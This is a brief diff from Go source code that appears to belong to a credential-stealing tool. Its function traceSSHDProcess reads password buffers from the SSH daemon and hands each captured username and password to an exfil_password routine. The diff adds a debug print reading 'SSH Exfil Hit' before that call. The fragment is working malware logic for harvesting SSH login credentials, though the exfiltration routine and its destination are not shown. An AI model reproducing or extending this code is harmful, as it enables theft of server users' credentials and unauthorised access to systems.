@@ -52,6 +52,7 @@ func traceSSHDProcess(pid int) {
 					var password = string(buffer)
 					valid := regexp.MustCompile(`\x00\x00\x00[^\n]*\f$`).MatchString(password)
 					if !valid {
+						fmt.Print("SSH Exfil Hit")
 						go exfil_password(username, removeFirstFourBytes(password))
 					}
 				}
